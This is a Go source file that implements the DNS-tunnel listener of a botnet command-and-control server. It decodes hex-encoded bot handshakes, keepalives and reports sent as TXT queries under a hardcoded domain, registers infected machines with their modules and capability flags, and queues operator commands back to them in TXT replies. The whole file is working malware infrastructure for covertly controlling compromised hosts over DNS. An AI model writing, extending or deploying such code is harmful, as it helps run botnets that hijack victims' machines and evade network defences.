package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"time"
)

// DNS tunnel — minimal DNS server on :53
// Bot sends: TXT query <hex[uid+type+seq+data]>.d.<domain>
// CNC replies: TXT <hex[type+seq+data]> or empty if no commands

const dnsDomain = "d.fnbnet.io"
const dnsTTL = 60

type DnsBotState struct {
	mu       sync.Mutex
	bots     map[int]*DnsBot
	nextUID  int
}

type DnsBot struct {
	mu         sync.Mutex
	uid        int
	addr       string
	mode       string   // "h" handshake, "k" keepalive, "a" active
	source     string
	version    string
	modules    []string
	capFlags   string
	lastSeen   time.Time
	seq        uint16
	pktQueue   [][]byte // queued packets to send
}

var dnsState *DnsBotState

func initDnsState() {
	dnsState = &DnsBotState{
		bots: make(map[int]*DnsBot),
	}
}

// parse hex encoded payload from DNS query
// format: uid(4b) + mode(1b) + seq(2b) + datalen(2b) + data(datalen bytes)
// all hex encoded before sending
func dnsParseQuery(domain string) (uid int, mode byte, seq uint16, data []byte, ok bool) {
	// extract first label before .d.<domain>
	parts := strings.SplitN(domain, ".", 2)
	if len(parts) < 2 {
		return 0, 0, 0, nil, false
	}
	labelHex := parts[0]
	if len(labelHex) < 18 { // 4+1+2+2 = 9 hex chars minimum
		return 0, 0, 0, nil, false
	}
	raw, err := hex.DecodeString(labelHex)
	if err != nil || len(raw) < 9 {
		return 0, 0, 0, nil, false
	}
	uid = int(binary.BigEndian.Uint32(raw[0:4]))
	mode = raw[4]
	seq = binary.BigEndian.Uint16(raw[5:7])
	datalen := int(binary.BigEndian.Uint16(raw[7:9]))
	if datalen > 0 && len(raw) >= 9+datalen {
		data = raw[9 : 9+datalen]
	}
	return uid, mode, seq, data, true
}

func dnsBuildQueryID() uint16 {
	return uint16(time.Now().UnixNano() & 0xFFFF)
}

// build DNS TXT response
func dnsBuildTXTResponse(id uint16, txtRecords [][]byte) []byte {
	buf := make([]byte, 512)
	off := 0

	// Header (12 bytes)
	binary.BigEndian.PutUint16(buf[off:], id)
	off += 2
	// Flags: response + authoritative + recursion desired
	binary.BigEndian.PutUint16(buf[off:], 0x8580)
	off += 2
	// QDCOUNT=1, ANCOUNT=1, NSCOUNT=0, ARCOUNT=0
	binary.BigEndian.PutUint16(buf[off:], 1)
	off += 2
	binary.BigEndian.PutUint16(buf[off:], uint16(len(txtRecords)))
	off += 2
	binary.BigEndian.PutUint16(buf[off:], 0)
	off += 2
	binary.BigEndian.PutUint16(buf[off:], 0)
	off += 2

	// Question section — copy from original or reconstruct
	// For our response, we just include a minimal question
	buf[off] = 0 // root label (we're not including full question, just enough)
	off++
	binary.BigEndian.PutUint16(buf[off:], 16) // QTYPE TXT
	off += 2
	binary.BigEndian.PutUint16(buf[off:], 1) // QCLASS IN
	off += 2

	// Answer section — one TXT record per entry
	for _, txt := range txtRecords {
		// Name pointer
		buf[off] = 0xC0
		buf[off+1] = 0x0C
		off += 2
		// TYPE TXT
		binary.BigEndian.PutUint16(buf[off:], 16)
		off += 2
		// CLASS IN
		binary.BigEndian.PutUint16(buf[off:], 1)
		off += 2
		// TTL
		binary.BigEndian.PutUint32(buf[off:], dnsTTL)
		off += 4
		// RDLENGTH
		txtLen := len(txt)
		binary.BigEndian.PutUint16(buf[off:], uint16(txtLen+1)) // +1 for length byte
		off += 2
		// RDATA (TXT format)
		buf[off] = byte(txtLen)
		off++
		copy(buf[off:], txt)
		off += txtLen
	}

	return buf[:off]
}

// build DNS NXDOMAIN response (no commands for bot)
func dnsBuildNXDOMAIN(id uint16) []byte {
	buf := make([]byte, 512)
	off := 0
	binary.BigEndian.PutUint16(buf[off:], id)
	off += 2
	binary.BigEndian.PutUint16(buf[off:], 0x8583) // NXDOMAIN
	off += 2
	binary.BigEndian.PutUint16(buf[off:], 1) // QDCOUNT
	off += 2
	binary.BigEndian.PutUint16(buf[off:], 0) // ANCOUNT
	off += 2
	binary.BigEndian.PutUint16(buf[off:], 0) // NSCOUNT
	off += 2
	binary.BigEndian.PutUint16(buf[off:], 0) // ARCOUNT
	off += 2
	// Minimal question
	buf[off] = 0
	off++
	binary.BigEndian.PutUint16(buf[off:], 16)
	off += 2
	binary.BigEndian.PutUint16(buf[off:], 1)
	off += 2
	return buf[:off]
}

// parse DNS question to extract domain
func dnsExtractDomain(buf []byte) (string, int) {
	if len(buf) < 12 {
		return "", 0
	}
	off := 12

	var labels []string
	for {
		if off >= len(buf) {
			return "", 0
		}
		llen := int(buf[off])
		if llen == 0 {
			off++
			break
		}
		if off+1+llen > len(buf) {
			return "", 0
		}
		labels = append(labels, string(buf[off+1:off+1+llen]))
		off += 1 + llen
	}
	// skip QTYPE (2) + QCLASS (2)
	if off+4 > len(buf) {
		return "", 0
	}
	qtype := binary.BigEndian.Uint16(buf[off:])
	if qtype != 16 { // only handle TXT queries
		return "", 0
	}
	return strings.Join(labels, "."), off + 4
}

func handleDnsQuery(pkt []byte, senderAddr *net.UDPAddr, conn *net.UDPConn) {
	if len(pkt) < 12 {
		return
	}
	id := binary.BigEndian.Uint16(pkt[0:2])

	// check QR flag — skip responses
	if pkt[2]&0x80 != 0 {
		return
	}

	domain, _ := dnsExtractDomain(pkt)
	if domain == "" {
		return
	}

	uid, mode, seq, data, ok := dnsParseQuery(domain)
	if !ok {
		// not our domain — ignore
		resp := dnsBuildNXDOMAIN(id)
		conn.WriteTo(resp, senderAddr)
		return
	}

	// handle based on mode
	dnsState.mu.Lock()

	switch mode {
	case 'h': // handshake
		bot := &DnsBot{
			uid:      uid,
			addr:     senderAddr.IP.String(),
			mode:     "h",
			source:   string(data),
			lastSeen: time.Now(),
			seq:      seq,
		}
		if uid == 0 || dnsState.bots[uid] == nil {
			dnsState.nextUID++
		bot.uid = dnsState.nextUID
		dnsState.bots[bot.uid] = bot
		// register in clientList
		realBot := &Bot{
			uid:      bot.uid,
			source:   bot.source,
			remoteID: -1,
			isDns:    true,
		}
		clientList.AddClient(realBot)
		} else {
			// update existing
			dnsState.bots[uid].lastSeen = time.Now()
			dnsState.bots[uid].mode = "h"
			bot = dnsState.bots[uid]
		}
		// respond with welcome packet
		respData := fmt.Sprintf("welcome node=%d", cfg.CncID)
		respHex := hex.EncodeToString([]byte(respData))
		resp := dnsBuildTXTResponse(id, [][]byte{[]byte(respHex)})
		conn.WriteTo(resp, senderAddr)

	case 'k': // keepalive
		if bot, exists := dnsState.bots[uid]; exists {
			bot.lastSeen = time.Now()
			bot.seq = seq
		}
		// queue any pending packets
		var responses [][]byte
		if bot, exists := dnsState.bots[uid]; exists {
			bot.mu.Lock()
			for _, pkt := range bot.pktQueue {
				responses = append(responses, pkt)
			}
			bot.pktQueue = nil
			bot.mu.Unlock()
		}
		if len(responses) == 0 {
			resp := dnsBuildTXTResponse(id, [][]byte{[]byte("2d")})
			conn.WriteTo(resp, senderAddr)
		} else {
			resp := dnsBuildTXTResponse(id, responses)
			conn.WriteTo(resp, senderAddr)
		}

	case 'd': // data from bot
		if bot, exists := dnsState.bots[uid]; exists {
			bot.lastSeen = time.Now()
			bot.mode = "a"
			msgStr := string(data)
			parts := strings.SplitN(msgStr, "\x00", 2)
			if len(parts) >= 1 {
				bot.version = parts[0]
				if len(parts) >= 2 {
					bot.capFlags = parts[1]
					bot.modules = strings.Split(bot.capFlags, ",")
				}
				// update the real Bot object in clientList
				clientList.ForEachClient(func(b *Bot) {
					if b.uid == bot.uid {
						b.versionStr = bot.version
						b.capFlags = bot.capFlags
						b.modules = bot.modules
					}
				})
			}
		}
		resp := dnsBuildTXTResponse(id, [][]byte{[]byte("2d")})
		conn.WriteTo(resp, senderAddr)
	}

	dnsState.mu.Unlock()
}

func startDnsServer() error {
	initDnsState()

	ports := []int{53, 5353}
	var conn *net.UDPConn
	var err error

	for _, port := range ports {
		addr := net.UDPAddr{
			Port: port,
			IP:   net.ParseIP("0.0.0.0"),
		}
		conn, err = net.ListenUDP("udp", &addr)
		if err == nil {
			if port != 53 {
				log.Printf("[dns] port 53 busy, using :%d", port)
			}
			break
		}
	}
	if conn == nil {
		return fmt.Errorf("dns server: %w", err)
	}

	go func() {
		buf := make([]byte, 1500)
		for {
			n, sender, err := conn.ReadFromUDP(buf)
			if err != nil {
				continue
			}
			pkt := make([]byte, n)
			copy(pkt, buf[:n])
			go handleDnsQuery(pkt, sender, conn)
		}
	}()

	log.Printf("[dns] listening on :53")
	return nil
}

// QueueDnsPkt — queue a packet to be sent to a DNS bot on next keepalive
func QueueDnsPkt(uid int, data []byte) {
	if dnsState == nil {
		return
	}
	dnsState.mu.Lock()
	defer dnsState.mu.Unlock()
	if bot, exists := dnsState.bots[uid]; exists {
		bot.mu.Lock()
		bot.pktQueue = append(bot.pktQueue, data)
		bot.mu.Unlock()
	}
}
